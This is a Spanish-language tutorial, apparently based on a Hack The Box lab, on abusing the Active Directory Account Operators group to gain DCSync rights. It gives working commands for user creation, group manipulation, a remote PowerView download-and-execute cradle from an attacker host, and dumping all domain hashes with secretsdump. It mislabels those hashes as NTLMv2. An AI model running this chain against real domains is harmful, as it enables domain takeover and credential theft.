---
title: Active Directory - Abusando del Grupo Account Operators
description: Abusando del grupo Account Operators para desencadenar en un DCSync Attack.
date: 2024-11-06
categories: [active-directory, account-operators]
tags: [grupos-de-usuarios-especiales, dcsync, secretsdump, exchange-windows-permissions, escalada-de-privilegios, casos-de-ataques-ad]
img_path: /assets/img/esquema-representativo-para-un-dcsync-desde-svc-alfresco.png
image: /assets/img/esquema-representativo-para-un-dcsync-desde-svc-alfresco.png
---

## **Introducción**

El grupo **Account Operators** lo que nos permite es la creación, modificación y eliminación de usuarios y grupos. Es por esto, por lo que supone una vía potencial de **escalada de privilegios** ya que podemos crear un usuario y asignarle el grupo *Exchange Windows Permissions* el cual, nos permitirá efectuar un *DCSync Attack*.

### **Gráfico del escenario**

En este escenario, aprenderemos a abusar del grupo **Account Operators** para poder realizar un *DCSync Attack*. Primero, crearemos un usuario aprovechando los permisos del grupo **Account Operators**. A este usuario, lo añadiremos al grupo **Exchange Windows Permissions**, desde el cual podremos asignarnos el privilegio de *DCSync*.

![esquema representativo para un dcsync desde svc-alfresco](/assets/img/esquema-representativo-para-un-dcsync-desde-svc-alfresco.png)

### **Contexto**

Supongamos que estamos en el grupo *Account Operators*, o en algún grupo que indirectamente sea miembro de dicho grupo. En este caso, nos encontramos como el usuario *svc-alfresco* el cual, es miembro del grupo *Service Accounts*.

![net user svc-alfresco](/assets/img/net-user-svc-alfresco.png)

Este grupo a su vez es miembro de *Privileged IT Accounts* y este mimo grupo a su vez, pertenece al grupo de *Account Operators*. Desde el grupo de *Account Operators* podemos añadir un usuario al grupo de *Exchange Windows Permissions*, desde el cual nos podremos asignar el privilegio de *DCSync* y **dumpearnos todos los hashes NTLMv2 de todos los usuarios del dominio**.

Todo esto, lo podemos ver más claro desde BloodHound.

![esquema de ataque para un dcsync desde svc-alfresco](/assets/img/esquema-de-ataque-para-un-dcsync-desde-svc-alfresco.png)

Al pertenecer indirectamente al grupo **Account Operators**, la cuenta *svc-alfresco* obtiene privilegios que le permiten realizar tareas como:

- **Crear, modificar y eliminar cuentas de usuario**.
- **Gestión de la membresía del grupo**.
- **Desbloqueo y restablecimiento de contraseñas**.
- **Gestión de propiedades de cuenta**.
- **Asignación y modificación de derechos de usuario**.

## **Manos a la obra**

Para abusar de esto, primeramente empezaremos creando un usuario y añadirle al dominio.

```powershell
net user hegociv hegociv123 /add /domain
```

Podemos comprobar las propiedades de este usuario.

```powershell
net user hegociv
```

![net user hegociv](/assets/img/net-user-hegociv.png)

Seguidamente, vamos a ver los grupos a los que le podemos asignar. En esta lista si observamos, nos encontramos con el grupo *Exchange Windows Permissions*.

![net group exchange windows permissions](/assets/img/net-group-exchange-windows-permissions.png)

Este grupo, tiene el permiso de **WriteDacl access** sobre el dominio (en este caso, sobre *htb.local*), que permite a cualquier miembro de este grupo, modificar los privilegios del dominio. Entre ellos, se encuentra el **privilegio de DCSync**.

Ahora que vemos que el grupo de *Exchange Windows Permissions* está disponible, añadiremos al usuario *hegociv*.

```powershell
net group "Exchange Windows Permissions" hegociv /add
```

Si visualizamos de nuevo, las propiedades de este usuario, veremos como ahora pertenecemos a este grupo.

![net user hegociv exchange windows permissions](/assets/img/net-user-hegociv-exchange-windows-permissions.png)

También, podemos ver los miembros y la información de este grupo.

```powershell
net group "Exchange Windows Permissions"
```

![net group exchange windows permissions information](/assets/img/net-group-exchange-windows-permissions-information.png)

En este momento, nos encontramos en el punto en el que deberemos de asignar el privilegio de *DCSync* pero antes, deberemos de configurar las credenciales del usuario con los siguientes comandos.

```powershell
$SecPassword = ConvertTo-SecureString 'hegociv123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMINIO\hegociv', $SecPassword)
```

En este caso, el *DOMINIO* será `htb.local`, por lo que deberemos de dejar este último comando de la siguiente manera.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\hegociv', $SecPassword)
```

Una vez que hemos creado el objeto, podremos manipularlo con `Add-DomainObjectAcl` para decirle: "*quiero que este usuario, cuya credencial es esta, asignarle el privilegio de DCSync*". Sin embargo, el comando de `Add-DomainObjectAcl` no existe de primeras, por lo que tendremos que invocarlo.

Para invocarlo, usaremos *[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)* desde el que nos descargaremos el binario de *[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)*.

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

Seguidamente, realizaremos una carga remota, por lo que nos ponemos primeramente en escucha con *Python3*, desde la ruta en la que se encuentra el binario de *PowerView.ps1*.

```bash
python3 -m http.server 8080
```

E invocaremos el binario desde *PowerShell* en la máquina víctima.

```powershell
IEX(New-Object Net.WebClient).downloadString('http://NUESTRA-IP:8080/PowerView.ps1')
```

Gracias a esto, habremos invocado el comando directamente.

![invocando el comando remotamente](/assets/img/invocando-el-comando-remotamente.png)

Ahora sí, podremos ejecutar el comando `Add-DomainObjectAcl` para asignar el privilegio de *DCSync*. Teniendo en cuenta que, nuestro dominio es *htb.local* y nuestro usuario es *hegociv*, deberemos de ejecutar el comando de la siguiente manera. Si tenemos otros datos, modificaremos estos mismos para que adaptarlo a nuestro caso.

>**A tener en cuenta**<br>
>El propio *BloodHound*, nos dice de asignar el privilegio *DCSync* de la siguiente forma:
>
>`Add-DomainObjectAcl -Credential $Cred -TargetIdentity DOMINIO -Rights DCSync`
>
>Sin embargo, este comando no nos funcionará correctamente y se nos quedará pillado. Por eso, debemos de modificar este comando para que funcione adecuadamente.

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hegociv -Rights DCSync
```

Ahora sí, podremos **dumpear todos los hashes NTLMv2 de los usuarios**. Para ello, usaremos `secretsdump.py` o `impacket-secretsdump`, indicándole el dominio, usuario e IP del DC correspondiente. Además, podemos indicarle que nos guarde todos los *hashes* en un fichero que nosotros le indicaremos con el parámetro `-outputfile`.

```bash
impacket-secretsdump DOMINIO/hegociv@IP -outputfile dcsync_hashes
```

![dumpeando todos los hashes NTLMv2 del dominio con impacket-secretsdump](/assets/img/dumpeando-todos-los-hashes-NTLMv2-del-dominio-con-impacket-secretsdump.png)

Podemos visualizar estos *hashes*, en el fichero que le hemos especificado más `.ntds`.

![fichero dcsync_hashes ntds secretsdump](/assets/img/fichero-dcsync-hashes-ntds-secretsdump.png)

## Enlaces de referencia
Los siguientes son una serie de enlaces los cuales, me han ayudado a realizar este artículo y a aprender sobre ello.

- [Account Operators Privilege Escalation](https://blog.cyberadvisors.com/technical-blog/blog/account-operators-privilege-escalation)
- [Resolución de la Máquina Forest - S4vitar](https://www.youtube.com/watch?v=7G5wkoBpFWU)
- [HackTricks - Dcsync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [Everything you need to know about DCSync attacks](https://blog.quest.com/everything-you-need-to-know-about-dcsync-attacks/)

## Despedida
Muchas gracias por leer este artículo, espero que hayas aprendido mucho sobre este escenario en el que abusamos del grupo de **Account Operators** para derivarlo a un **DCSync Attack**. ¡Nos vemos en la próxima
